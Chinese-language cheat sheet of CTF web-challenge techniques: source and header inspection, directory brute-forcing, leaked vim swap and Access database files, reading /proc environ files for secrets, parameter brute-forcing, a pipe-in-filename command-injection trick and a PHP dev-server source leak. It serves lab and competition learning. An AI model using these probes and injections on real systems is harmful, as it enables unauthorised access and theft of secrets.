拿到题，访问web。
查看源码 仔细查看或者搜索关键词，如flag,include等，提示方向。

F12查看网络请求情况。
最好抓包，仔细查看请求头，响应头信息。

查看传参，回显情况。sql注入，文件包含，模板注入。

目录测试，如flag.php，robots.txt，www.zip
探针/tz.php，/backup.sql
```
D:\mypython\python311\python.exe  dirsearch.py -u "http://16b5eb0b-ac30-452a-808a-0e9214102abd.node3.buuoj.cn/" -s 1 --exclude-status=429,403 -t 1
```

^
早期 asp+access 架构的数据库文件为db.mdb，访问/db/db.mdb下载一个文件。Access或文本打开搜索得到flag。

^
临时文件
>临时文件是在vim编辑文本时就会创建的文件，如果程序正常退出，临时文件自动删除，如果意外退出就会保留，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容。所以通过在url后面加上/index.php.swp即可看到flag。
以index.php来说，第一次退出后，缓存文件名为index.php.swp，第二次退出后，缓存文件名为index.php.swo,第三次退出后文件名为index.php.swn。
场景：发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了

^
一般flag在/flag或/flag.txt中，也可能在env命令环境变量中，还可能在phpinfo()中，php的$GLOBALS数组中, echo $flag中。
/read?file=/proc/self/environ
/read?file=/proc/environ
cat /proc/1/environ
cat /proc/$PID/environ
^
## **爆破参数**
一个网站没有任何传参提示，如python ssti注入点，需要用工具爆破出参数。
工具arjun


**安装**
```
pip3 install arjun
```
或者下载github项目<https://github.com/s0md3v/Arjun>，使用python安装
```
python3 setup.py install
```

**使用**
```
python3 arjun -u http://e3.buuoj.cn/ -c 100 -d 5
arjun  -u http://e3.buuoj.cn/ -c 100 -d 5
```


^
## **linux中程序漏洞**
GET函数漏洞
>低层的open函数存在命令执行漏洞：如果open文件名中存在管道符（也叫或符号|），就会将文件名直接以命令的形式执行，然后将命令的结果存到与命令同名的文件中(前提先有这个文件)。
```
GET /
查看根目录目录
GET file:|readflag
会执行readflag程序的命令，并返回程序执行结果到readflag文件，没有先创建。

GET file:bash -c /readflag|
会执行readflag程序命令，并返回程序执行结果到readflag|文件，没有先创建。
```


^
## **nuclei扫描**
有时候可能会出现一些cve漏洞作为前提，这时候可以漏扫一下先。


如：PHP<=7.4.21时通过`php -S`开起的WEB[服务器]存在源码泄露漏洞。 
payload：
```
GET /flag.php HTTP/1.1
Host: challenge.wucup.cn:38308


GET /Kawakaze HTTP/1.1
```
